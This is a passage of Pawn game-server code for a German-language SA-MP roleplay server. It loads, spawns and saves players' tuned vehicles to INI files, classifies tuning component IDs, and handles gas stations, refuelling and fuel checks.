					if( strcmp( key , "CarBuyedDay" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarBuyedDay] = strval( val ); }
					if( strcmp( key , "CarBuyedMonth" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarBuyedMonth] = strval( val ); }
					if( strcmp( key , "CarBuyedYear" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarBuyedYear] = strval( val ); }

					if( strcmp( key , "CarTurbo" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][CarTurbo] = strval( val ); }

					if( strcmp( key , "IsWohnwagen" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][IsWohnwagen] = strval( val ); }

					if( strcmp( key , "SoundSystem" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][SoundSystem] = strval( val ); }
					if( strcmp( key , "SoundSystemData" , true ) == 0 ) { val = ini_GetValue( Data ); PlayerCar[playerid][x][SoundSystemData] = strval( val ); }
				}
		        fclose(UserFile);
		        PlayerCarSpawn(playerid,x);
			}
		}
	}
}
Function PlayerCarSpawn(playerid,Slot)
{
	if(IsPlayerConnected(playerid))
	{
	    Dtc_PlayerHaveCar[playerid][Slot] = 1;
		if(Dtc_PlayerHaveCar[playerid][Slot] == 1)
    	{
    	    PlayerCar[playerid][Slot][CarId] = CreateVehicle(PlayerCar[playerid][Slot][CarModel],PlayerCar[playerid][Slot][CarPos_x],PlayerCar[playerid][Slot][CarPos_y],PlayerCar[playerid][Slot][CarPos_z],PlayerCar[playerid][Slot][CarRotate],PlayerCar[playerid][Slot][CarC1],PlayerCar[playerid][Slot][CarC2],-1, 0);


    	    if(PlayerCar[playerid][Slot][CarPJ] >= 0) {ChangeVehiclePaintjob(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarPJ]);}
			if(PlayerCar[playerid][Slot][CarNitro] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarNitro]);}
			if(PlayerCar[playerid][Slot][CarHyd] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarHyd]);}
			if(PlayerCar[playerid][Slot][CarWheel] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarWheel]);}
			if(PlayerCar[playerid][Slot][CarAusp] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarAusp]);}
			if(PlayerCar[playerid][Slot][CarSideL] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarSideL]);}
			if(PlayerCar[playerid][Slot][CarSideR] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarSideR]);}
			if(PlayerCar[playerid][Slot][CarFB] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarFB]);}
			if(PlayerCar[playerid][Slot][CarRB] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarRB]);}
			if(PlayerCar[playerid][Slot][CarSpoiler] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarSpoiler]);}
			if(PlayerCar[playerid][Slot][CarRoof] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarRoof]);}
			if(PlayerCar[playerid][Slot][CarHood] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarHood]);}
			if(PlayerCar[playerid][Slot][CarVents] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarVents]);}
			if(PlayerCar[playerid][Slot][CarLamps] != 0) {AddVehicleComponent(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarLamps]);}
    	    ChangeVehicleColor(PlayerCar[playerid][Slot][CarId],PlayerCar[playerid][Slot][CarC1],PlayerCar[playerid][Slot][CarC2]);
			if(PlayerCar[playerid][Slot][Neon] == 1)
			{
				new Float:x,Float:y,Float:z;
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon] = CreateObject(18648,x,y,z,0,0,0,283);
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1] = CreateObject(18648,x,y,z,0,0,0,283);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon], PlayerCar[playerid][Slot][CarId], 0.8,0,-0.70,0,0,0);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1], PlayerCar[playerid][Slot][CarId], -0.8,0,-0.70,0,0,0);
			}
			if(PlayerCar[playerid][Slot][Neon] == 2)
			{
				new Float:x,Float:y,Float:z;
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon] = CreateObject(18647,x,y,z,0,0,0,283);
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1] = CreateObject(18647,x,y,z,0,0,0,283);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon], PlayerCar[playerid][Slot][CarId], 0.8,0,-0.70,0,0,0);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1], PlayerCar[playerid][Slot][CarId], -0.8,0,-0.70,0,0,0);
			}
			if(PlayerCar[playerid][Slot][Neon] == 3)
			{
				new Float:x,Float:y,Float:z;
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon] = CreateObject(18649,x,y,z,0,0,0,283);
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1] = CreateObject(18649,x,y,z,0,0,0,283);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon], PlayerCar[playerid][Slot][CarId], 0.8,0,-0.70,0,0,0);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1], PlayerCar[playerid][Slot][CarId], -0.8,0,-0.70,0,0,0);
			}
			if(PlayerCar[playerid][Slot][Neon] == 4)
			{
				new Float:x,Float:y,Float:z;
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon] = CreateObject(18652,x,y,z,0,0,0,283);
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1] = CreateObject(18652,x,y,z,0,0,0,283);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon], PlayerCar[playerid][Slot][CarId], 0.8,0,-0.70,0,0,0);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1], PlayerCar[playerid][Slot][CarId], -0.8,0,-0.70,0,0,0);
			}
			if(PlayerCar[playerid][Slot][Neon] == 5)
			{
				new Float:x,Float:y,Float:z;
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon] = CreateObject(18651,x,y,z,0,0,0,283);
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1] = CreateObject(18651,x,y,z,0,0,0,283);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon], PlayerCar[playerid][Slot][CarId], 0.8,0,-0.70,0,0,0);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1], PlayerCar[playerid][Slot][CarId], -0.8,0,-0.70,0,0,0);
			}
			if(PlayerCar[playerid][Slot][Neon] == 6)
			{
				new Float:x,Float:y,Float:z;
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon] = CreateObject(18650,x,y,z,0,0,0,283);
				Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1] = CreateObject(18650,x,y,z,0,0,0,283);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon], PlayerCar[playerid][Slot][CarId], 0.8,0,-0.70,0,0,0);
				AttachObjectToVehicle(Neonrohr[PlayerCar[playerid][Slot][CarId]][Neon1], PlayerCar[playerid][Slot][CarId], -0.8,0,-0.70,0,0,0);
			}



			if(PlayerCar[playerid][Slot][IsWohnwagen] == 1)
			{//3168
				new Float:x,Float:y,Float:z;
				Wohnwagen[PlayerCar[playerid][Slot][CarId]] = CreateObject(3171,x,y,z,0,0,0,283);
				AttachObjectToVehicle(Wohnwagen[PlayerCar[playerid][Slot][CarId]], PlayerCar[playerid][Slot][CarId], 0.084999, -2.125115, -1.144999, -3.014999, 0.000000, 178.890090);

				WohnwagenID[playerid] = PlayerCar[playerid][Slot][CarId];
			}







//			new strings[15];
//  		new name[MAX_PLAYER_NAME], str[128];
//	    	GetPlayerName(playerid, name, sizeof name);
//	    	format(str, sizeof str, "/Autos/%s%d.ini", name,Dtc_PlayerKey[playerid]);
//			format(strings, sizeof(strings), "%s", dini_Get(str, "Plate"));


			new strings[15];
  			new name[MAX_PLAYER_NAME], str[128];
	    	GetPlayerName(playerid, name, sizeof name);
	    	format(str, sizeof str, "/Autos/%s%d.ini", name,Dtc_PlayerKey[playerid]);
			format(strings, sizeof(strings), "%s", dini_Get(str, "Plate"));
			SetVehicleNumberPlate(PlayerCar[playerid][Slot][CarId], strings);  // hurensohn skrupy.....

			SetVehicleToRespawn(PlayerCar[playerid][Slot][CarId]);
    	}
	}
}
forward OnPlayerCarUpdate(playerid, bool:deletecar);
public OnPlayerCarUpdate(playerid,bool:deletecar)
{
	if(IsPlayerConnected(playerid))
	{
	    for(new x = 0; x < MaxVeh; x++)
		{
			if(Dtc_PlayerHaveCar[playerid][x])
			{
				if(deletecar)
				{
					DestroyVehicle(PlayerCar[playerid][x][CarId]);
					if(PlayerCar[playerid][x][Neon] >= 1)
					{
		     		DestroyObject(Neonrohr[PlayerCar[playerid][x][CarId]][Neon]);
	     			DestroyObject(Neonrohr[PlayerCar[playerid][x][CarId]][Neon1]);
					}
				}
				new string3[128];
				format(string3, sizeof(string3), "/Autos/%s%d.ini", PlayerInfo[playerid][Name],x);
				new File: hFile = fopen(string3, io_write);
				if (hFile)
				{
				    new var[32];
				    format(var, 32, "CarId=%d\n",PlayerCar[playerid][x][CarId]);fwrite(hFile, var);
			    	format(var, 32, "CarModel=%d\n",PlayerCar[playerid][x][CarModel]);fwrite(hFile, var);
			    	format(var, 32, "CarPos_x=%.3f\n",PlayerCar[playerid][x][CarPos_x]);fwrite(hFile, var);
					format(var, 32, "CarPos_y=%.3f\n",PlayerCar[playerid][x][CarPos_y]);fwrite(hFile, var);
					format(var, 32, "CarPos_z=%.3f\n",PlayerCar[playerid][x][CarPos_z]);fwrite(hFile, var);
					format(var, 32, "CarRotate=%.3f\n",PlayerCar[playerid][x][CarRotate]);fwrite(hFile, var);
					format(var, 32, "CarNitro=%d\n",PlayerCar[playerid][x][CarNitro]);fwrite(hFile, var);
					format(var, 32, "CarHyd=%d\n",PlayerCar[playerid][x][CarHyd]);fwrite(hFile, var);
					format(var, 32, "Kilometer=%d\n",PlayerCar[playerid][x][Kilometer]);fwrite(hFile, var);
					format(var, 32, "Benzin=%d\n",PlayerCar[playerid][x][Benzin]);fwrite(hFile, var);
					format(var, 32, "CarWheel=%d\n",PlayerCar[playerid][x][CarWheel]);fwrite(hFile, var);
					format(var, 32, "CarAusp=%d\n",PlayerCar[playerid][x][CarAusp]);fwrite(hFile, var);
					format(var, 32, "CarSideL=%d\n",PlayerCar[playerid][x][CarSideL]);fwrite(hFile, var);
					format(var, 32, "CarSideR=%d\n",PlayerCar[playerid][x][CarSideR]);fwrite(hFile, var);
					format(var, 32, "CarFB=%d\n",PlayerCar[playerid][x][CarFB]);fwrite(hFile, var);
					format(var, 32, "CarRB=%d\n",PlayerCar[playerid][x][CarRB]);fwrite(hFile, var);
					format(var, 32, "CarSpoiler=%d\n",PlayerCar[playerid][x][CarSpoiler]);fwrite(hFile, var);
					format(var, 32, "CarRoof=%d\n",PlayerCar[playerid][x][CarRoof]);fwrite(hFile, var);
					format(var, 32, "CarHood=%d\n",PlayerCar[playerid][x][CarHood]);fwrite(hFile, var);
					format(var, 32, "CarVents=%d\n",PlayerCar[playerid][x][CarVents]);fwrite(hFile, var);
					format(var, 32, "CarLamps=%d\n",PlayerCar[playerid][x][CarLamps]);fwrite(hFile, var);
					format(var, 32, "CarPJ=%d\n",PlayerCar[playerid][x][CarPJ]);fwrite(hFile, var);
					format(var, 32, "CarC1=%d\n",PlayerCar[playerid][x][CarC1]);fwrite(hFile, var);
					format(var, 32, "CarC2=%d\n",PlayerCar[playerid][x][CarC2]);fwrite(hFile, var);
					format(var, 32, "Preis=%d\n",PlayerCar[playerid][x][CarPreis]);fwrite(hFile, var);
					format(var, 32, "Plate=%s\n",PlayerCar[playerid][x][Plate]);fwrite(hFile, var);
					format(var, 32, "Neon=%d\n",PlayerCar[playerid][x][Neon]);fwrite(hFile, var);
					format(var, 32, "Abgeschleppt=%d\n",PlayerCar[playerid][x][Abgeschleppt]);fwrite(hFile, var);
					format(var, 32, "LPG=%d\n",PlayerCar[playerid][x][LPG]);fwrite(hFile, var);
					//Kofferaumsystem
					format(var, 32, "CarDrogen=%d\n",PlayerCar[playerid][x][CarDrogen]);fwrite(hFile, var);
					format(var, 32, "CarMats=%d\n",PlayerCar[playerid][x][CarMats]);fwrite(hFile, var);
					format(var, 32, "CarDeagle=%d\n",PlayerCar[playerid][x][CarDeagle]);fwrite(hFile, var);
					format(var, 32, "CarShotgun=%d\n",PlayerCar[playerid][x][CarShotgun]);fwrite(hFile, var);
					format(var, 32, "CarMP5=%d\n",PlayerCar[playerid][x][CarMP5]);fwrite(hFile, var);
					format(var, 32, "CarAk47=%d\n",PlayerCar[playerid][x][CarAk47]);fwrite(hFile, var);
					format(var, 32, "CarM4=%d\n",PlayerCar[playerid][x][CarM4]);fwrite(hFile, var);
					format(var, 32, "CarRifle=%d\n",PlayerCar[playerid][x][CarRifle]);fwrite(hFile, var);
					format(var, 32, "CarSniper=%d\n",PlayerCar[playerid][x][CarSniper]);fwrite(hFile, var);
					format(var, 32, "CarGivekey=%s\n",PlayerCar[playerid][x][CarGivekey]);fwrite(hFile, var);
					format(var, 32, "CarBuyedDay=%d\n",PlayerCar[playerid][x][CarBuyedDay]);fwrite(hFile, var);
					format(var, 32, "CarBuyedMonth=%d\n",PlayerCar[playerid][x][CarBuyedMonth]);fwrite(hFile, var);
					format(var, 32, "CarBuyedYear=%d\n",PlayerCar[playerid][x][CarBuyedYear]);fwrite(hFile, var);

					format(var, 32, "CarTurbo=%d\n",PlayerCar[playerid][x][CarTurbo]);fwrite(hFile, var);
					format(var, 32, "IsWohnwagen=%d\n",PlayerCar[playerid][x][IsWohnwagen]);fwrite(hFile, var);

					format(var, 32, "SoundSystem=%d\n",PlayerCar[playerid][x][SoundSystem]);fwrite(hFile, var);
					format(var, 32, "SoundSystemData=%d\n",PlayerCar[playerid][x][SoundSystem]);fwrite(hFile, var);

					fclose(hFile);
				}
			}
		}
	}
}
Function IsADtCar(car)
{
    for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
	    for(new x = 0; x < MaxVeh; x++)
		{
			if(IsPlayerConnected(playerid) && Dtc_PlayerHaveCar[playerid][x])
			{
	    	 	if (car == PlayerCar[playerid][x][CarId])
		     	{
		     	    return 1;
		     	}
			}
		}
	}
	return 0;
}
Function IsASideR(componentid)
{
    if(componentid == 1007)
	{
	    SideL = 1017;
		return 1;
	}
	if(componentid == 1026)
	{
	    SideL = 1027;
		return 1;
	}
	if(componentid == 1030)
	{
	    SideL = 1031;
		return 1;
	}
	if(componentid == 1040)
	{
	    SideL = 1036;
		return 1;
	}
	if(componentid == 1041)
	{
	    SideL = 1039;
		return 1;
	}
	if(componentid == 1042)
	{
	    SideL = 1099;
		return 1;
	}
	if(componentid == 1051)
	{
	    SideL = 1047;
		return 1;
	}
	if(componentid == 1048)
	{
	    SideL = 1052;
		return 1;
	}
	if(componentid == 1056)
	{
	    SideL = 1062;
		return 1;
	}
	if(componentid == 1063)
	{
	    SideL = 1057;
		return 1;
	}
	if(componentid == 1069)
	{
	    SideL = 1071;
		return 1;
	}
	if(componentid == 1072)
	{
	    SideL = 1070;
		return 1;
	}
	if(componentid == 1094)
	{
	    SideL = 1090;
		return 1;
	}
	if(componentid == 1093)
	{
	    SideL = 1095;
		return 1;
	}
	if(componentid == 1122)
	{
	    SideL = 1101;
		return 1;
	}
	if(componentid == 1102)
	{
	    SideL = 1133;
		return 1;
	}
 	if(componentid == 1124)
	{
	    SideL = 1106;
		return 1;
	}
	if(componentid == 1107)
	{
	    SideL = 1108;
		return 1;
	}
	if(componentid == 1118)
	{
	    SideL = 1120;
		return 1;
	}
	if(componentid == 1137)
	{
	    SideL = 1134;
		return 1;
	}
	return 0;
}

Function IsASideL(componentid)
{
    if(componentid == 1134)
	{
	    SideR = 1137;
		return 1;
	}
    if(componentid == 1119)
	{
	    SideR = 1121;
		return 1;
	}
    if(componentid == 1120)
	{
	    SideR = 1118;
		return 1;
	}
    if(componentid == 1108)
	{
	    SideR = 1107;
		return 1;
	}
    if(componentid == 1017)
	{
	    SideR = 1007;
		return 1;
	}
	if(componentid == 1027)
	{
	    SideR = 1026;
		return 1;
	}
	if(componentid == 1031)
	{
	    SideR = 1030;
		return 1;
	}
	if(componentid == 1036)
	{
	    SideR = 1040;
		return 1;
	}
	if(componentid == 1039)
	{
	    SideR = 1041;
		return 1;
	}
	if(componentid == 1099)
	{
	    SideR = 1042;
		return 1;
	}
	if(componentid == 1047)
	{
	    SideR = 1051;
		return 1;
	}
	if(componentid == 1052)
	{
	    SideR = 1048;
		return 1;
	}
	if(componentid == 1062)
	{
	    SideR = 1056;
		return 1;
	}
	if(componentid == 1057)
	{
	    SideR = 1063;
		return 1;
	}
	if(componentid == 1071)
	{
	    SideR = 1069;
		return 1;
	}
	if(componentid == 1070)
	{
	    SideR = 1072;
		return 1;
	}
	if(componentid == 1090)
	{
	    SideR = 1094;
		return 1;
	}
	if(componentid == 1095)
	{
	    SideR = 1093;
		return 1;
	}
	if(componentid == 1095)
	{
	    SideR = 1093;
		return 1;
	}
	if(componentid == 1101)
	{
	    SideR = 1122;
		return 1;
	}
	if(componentid == 1133)
	{
	    SideR = 1102;
		return 1;
	}
	if(componentid == 1106)
	{
	    SideR = 1124;
		return 1;
	}
	return 0;
}

Function IsAFB(componentid)
{
    if(componentid >= 1152 && componentid <= 1153 || componentid >= 1165 && componentid <= 1166)
	{
		return 1;
	}
	if(componentid == 1155 || componentid == 1157 || componentid == 1160 || componentid == 1176 || componentid == 1179 || componentid == 1185)
	{
		return 1;
	}
	if(componentid >= 1169 && componentid <= 1174 || componentid >= 1181 && componentid <= 1182)
	{
		return 1;
	}
	if(componentid >= 1188 && componentid <= 1191)
	{
		return 1;
	}
	return 0;
}

Function IsARB(componentid)
{
    if(componentid >= 1140 && componentid <= 1141 || componentid >= 1148 && componentid <= 1151)
	{
		return 1;
	}
	if(componentid == 1154 || componentid == 1156 || componentid == 1159 || componentid == 1161 || componentid == 1175 || componentid == 1180)
	{
		return 1;
	}
	if(componentid >= 1167 && componentid <= 1168 || componentid >= 1177 && componentid <= 1178)
	{
		return 1;
	}
 	if(componentid >= 1183 && componentid <= 1184 || componentid >= 1186 && componentid <= 1187)
	{
		return 1;
	}
	if(componentid >= 1192 && componentid <= 1193)
	{
		return 1;
	}
	return 0;
}

Function IsASpoiler(componentid)
{
    if(componentid >= 1000 && componentid <= 1003 || componentid >= 1014 && componentid <= 1016)
	{
		return 1;
	}
	if(componentid == 1023 || componentid == 1058 || componentid == 1158)
	{
		return 1;
	}
	if(componentid >= 1049 && componentid <= 1050 || componentid >= 1138 && componentid <= 1139)
	{
		return 1;
	}
 	if(componentid >= 1146 && componentid <= 1147 || componentid >= 1162 && componentid <= 1164)
	{
		return 1;
	}
	return 0;
}

Function IsARoof(componentid)
{
    if(componentid >= 1032 && componentid <= 1033 || componentid >= 1053 && componentid <= 1055)
	{
		return 1;
	}
	if(componentid == 1035 || componentid == 1038 || componentid == 1061 || componentid == 1088 || componentid == 1091)
	{
		return 1;
	}
	if(componentid == 1103 || componentid == 1128)
	{
		return 1;
	}
	if(componentid >= 1067 && componentid <= 1068 || componentid >= 1130 && componentid <= 1131)
	{
		return 1;
	}
	return 0;
}
Function IsAExhaust(componentid)
{
    if(componentid >= 1018 && componentid <= 1022)
	{
		return 1;
	}
	if(componentid >= 1028 && componentid <= 1029)
	{
		return 1;
	}
	if(componentid == 1037 || componentid == 1059 || componentid == 1089 || componentid == 1092 || componentid == 1132)
	{
		return 1;
	}
	if(componentid == 1104 || componentid == 1105 || componentid == 1113 || componentid == 1114 || componentid == 1129)
	{
		return 1;
	}
	if(componentid == 1135 || componentid == 1136)
	{
		return 1;
	}
	if(componentid >= 1043 && componentid <= 1046)
	{
		return 1;
	}
	if(componentid >= 1126 && componentid <= 1127)
	{
		return 1;
	}
	if(componentid >= 1064 && componentid <= 1066)
	{
		return 1;
	}
	return 0;
}

Function IsAWheel(componentid)
{
    if(componentid >= 1073 && componentid <= 1085)
	{
		return 1;
	}
	if(componentid >= 1096 && componentid <= 1098)
	{
		return 1;
	}
	if(componentid == 1025)
	{
		return 1;
	}
	return 0;
}
public IsAShowCarEdel(carid)
{
	for(new i = 0; i < sizeof(ShowCarEdel); i++)
	{
	    if(carid == ShowCarEdel[i])
	    {
			return 1;
 		}
	}
	return 0;
}
public IsAHandelCar(carid)
{
	for(new i = 0; i < sizeof(HandelCar); i++)
	{
	    if(carid == HandelCar[i])
	    {
			return 1;
 		}
	}
	return 0;
}
stock GetCarAutohaus(playerid, carid)
{
	new vmodel = GetVehicleModel(carid);
	if(vmodel == 579 || vmodel == 507 || vmodel == 419 || vmodel == 526 || vmodel == 589 || vmodel == 413 || vmodel == 440 || vmodel == 602 || vmodel == 400 || vmodel == 405 || vmodel == 445 || vmodel == 475 || vmodel == 467 || vmodel == 536 || vmodel == 534 || vmodel == 567 || vmodel == 535 || vmodel == 412 || vmodel == 458 || vmodel == 479 || vmodel == 518 || vmodel == 542 || vmodel == 496 || vmodel == 439|| vmodel == 482)//482
	{
        dtc_AutohausCat[playerid] = 0;// Intercars
	}
	if(vmodel == 550 || vmodel == 540 || vmodel == 404 || vmodel == 533 || vmodel == 500 || vmodel == 508 || vmodel == 545 || vmodel == 554 || vmodel == 565 || vmodel == 561 || vmodel == 489 || vmodel == 587 || vmodel == 527)
	{
	    dtc_AutohausCat[playerid] = 1;// Wang Cars
	}
	if(vmodel == 409 || vmodel == 429 || vmodel == 411 || vmodel == 415 || vmodel == 451 || vmodel == 541 || vmodel == 559 || vmodel == 560 || vmodel == 506 || vmodel == 522 )
	{
	    dtc_AutohausCat[playerid] = 2; // Grottis
	}
	if(vmodel == 519 || vmodel == 487 || vmodel == 593)
	{
	    dtc_AutohausCat[playerid] = 3;// Airport LS
	}
	if(vmodel == 578 || vmodel == 568 || vmodel == 503 || vmodel == 502 || vmodel == 483 || vmodel == 424|| vmodel == 531|| vmodel == 478 || vmodel == 495)
	{
	    dtc_AutohausCat[playerid] = 4;// Rastplatz
	}
	if(vmodel == 581 || vmodel == 586 || vmodel == 468 || vmodel == 471 || vmodel == 521 || vmodel == 481|| vmodel == 463|| vmodel == 461|| vmodel == 462)
	{
	    dtc_AutohausCat[playerid] = 5;// Bikes
	}
	if(vmodel == 549 || vmodel == 555 || vmodel == 546 || vmodel == 585 || vmodel == 516 || vmodel == 547|| vmodel == 543|| vmodel == 517)
	{
	    dtc_AutohausCat[playerid] = 6;// SF2
	}
	if(vmodel == 493 || vmodel == 472 || vmodel == 473 || vmodel == 454 || vmodel == 452 || vmodel == 453)
	{
	    dtc_AutohausCat[playerid] = 7;// boote
	}
}
forward ShowPlayerCar(playerid);
public ShowPlayerCar(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new Float:vehx, Float:vehy, Float:vehz;
		GetVehiclePos(PlayerCar[playerid][Dtc_PlayerKey[playerid]][CarId], vehx, vehy, vehz);
		SetPlayerCheckpoint(playerid, vehx, vehy, vehz, 5.0);


		return 1;
	}
	return 1;
}
Function IsAtGasStation(playerid)
{
    if(IsPlayerConnected(playerid))
	{
		if(IsPlayerInRangeOfPoint(playerid,18.0,1004.0070,-939.3102,42.1797) || IsPlayerInRangeOfPoint(playerid,18.0,1944.3260,-1772.9254,13.3906))
		{//LS
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,18.0,-90.5515,-1169.4578,2.4079) || IsPlayerInRangeOfPoint(playerid,18.0,-1609.7958,-2718.2048,48.5391))
		{//LS
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,18.0,-2029.4968,156.4366,28.9498) || IsPlayerInRangeOfPoint(playerid,18.0,-2408.7590,976.0934,45.4175))
		{//SF
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,18.0,-2243.9629,-2560.6477,31.8841) || IsPlayerInRangeOfPoint(playerid,18.0,-1676.6323,414.0262,6.9484))
		{//Between LS and SF
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,18.0,2202.2349,2474.3494,10.5258) || IsPlayerInRangeOfPoint(playerid,18.0,614.9333,1689.7418,6.6968))
		{//LV
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,18.0,-1328.8250,2677.2173,49.7665) || IsPlayerInRangeOfPoint(playerid,18.0,70.3882,1218.6783,18.5165))
		{//LV
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid,18.0,2113.7390,920.1079,10.5255) || IsPlayerInRangeOfPoint(playerid,18.0,-1327.7218,2678.8723,50.0625))
		{//LV
  			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 2002.8409,-2382.0603,13.5469))
		{//LS Airport
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 30.0, 1808.6943,-2429.6477,13.5547))
		{//LS Airport
		    return 1;
		}
	}
	return 0;
}
Function Fillup()
{
	for(new i=0; i<MAX_PLAYERS; i++)
   	{
	   	if(IsPlayerConnected(i))
	   	{
		    new VID;
		    new FillUp;
		    new string[256];
		    VID = GetPlayerVehicleID(i);
			if(Refueling[i] == 1)
		    {
				for(new b = 0; b < sizeof(TankeInfo); b++)
				{
					if(IsPlayerInRangeOfPoint(i,25.0, TankeInfo[b][tEntranceX], TankeInfo[b][tEntranceY], TankeInfo[b][tEntranceZ]))
					{
		              	if(GetPlayerMoneySave(i) < 0)
		              	{
						SendClientMessage(i, COLOR_GRAD2, "Du hast zu wenig Geld!");
						UnFreezePlayer(i);
						return 1;
						}
					 	new fahrzeug = GetPlayerVehicleID(i);
					    if(IsADtCar(fahrzeug))
					    {
							 new carowner = GetDtCarOwner(fahrzeug);
							 new slot = GetDtCarOwnerSlot(carowner,fahrzeug);
			  				 FillUp = GetGasMax(GetVehicleModel(VID))-PlayerCar[carowner][slot][Benzin];
						     PlayerCar[carowner][slot][Benzin] += FillUp;
		  					 TankeInfo[b][tProducts] -= FillUp;
					 	}
					    else for(new fc;fc<sizeof(FactionCars);fc++)
						{
						    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
							{
						        if(fahrzeug == FactionCars[fc][fCarid])
								{
			  						 FillUp = GetGasMax(GetVehicleModel(VID))-FactionCars[fc][fTuning][16];
				                     FactionCars[fc][fTuning][16] += FillUp;
		  							 TankeInfo[b][tProducts] -= FillUp;
						  		}
							}
						}
						FillUp = FillUp * TankeInfo[b][tEntranceCost];
					    format(string,sizeof(string),"* Fahrzeug für $%d aufgetankt. (Preis pro Liter: $%d)",FillUp,TankeInfo[b][tEntranceCost]);
					    SendClientMessage(i,COLOR_LIGHTBLUE,string);
						GivePlayerMoneySave(i, - FillUp);
//						TankeInfo[b][tProducts] -= FillUp;
						TankeInfo[b][tTill] += FillUp;
//						TankeInfo[b][tExtortion] += FillUp;
						Refueling[i] = 0;
						UnFreezePlayer(i);
						OnPropUpdate_t(b);
			 		}
			    }
		 	}
		}
	}
	return 1;
}
stock GetGasMax(vehmodel)
{
	if(vehmodel >= 400 && vehmodel <= 611)
	{
	    return GasMax[(vehmodel-400)];
	}
	return 100;
}

Function CheckGas()
{
//	new string[256];
	for(new i=0;i<MAX_PLAYERS;i++)
	{
    	if(IsPlayerConnected(i))
       	{
       	    if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
       	    {
				new fahrzeug = GetPlayerVehicleID(i);
	 			new engine,lights,alarm,doors,bonnet,boot,objective;
				new vid = GetPlayerVehicleID(i);
				GetVehicleParamsEx(vid,engine,lights,alarm,doors,bonnet,boot,objective);
//	       		new vehicle = GetPlayerVehicleID(i);
//	       		new Model = GetVehicleModel(GetPlayerVehicleID(i));
				new carowner = GetDtCarOwner(fahrzeug);
				new slot = GetDtCarOwnerSlot(carowner,fahrzeug);
				if(engine == 1)
				{
					    if(IsADtCar(fahrzeug))
					    {
						    if(PlayerCar[carowner][slot][Benzin] <= 0)
						    {
			     				PlayerPlaySound(i, 1085, 0.0, 0.0, 0.0);
								SetVehicleParamsEx(vid, VEHICLE_PARAMS_OFF, lights, alarm, doors, bonnet, boot, objective); // ONLY the engine param was changed to VEHICLE_PARAMS_ON (1)
		        				GameTextForPlayer(i,"~w~~n~~n~~n~~n~~n~~n~~n~~n~Kein Benzin mehr~n~Motor wurde abgeschaltet",1500,3);
					 		}
					 	}
					    else for(new fc;fc<sizeof(FactionCars);fc++)
						{
						    if(FactionCars[fc][fVehid] >= 400 && FactionCars[fc][fVehid] <= 611)
							{
						        if(fahrzeug == FactionCars[fc][fCarid])
								{
								    if(FactionCars[fc][fTuning][16] <= 0)
								    {
			     						PlayerPlaySound(i, 1085, 0.0, 0.0, 0.0);
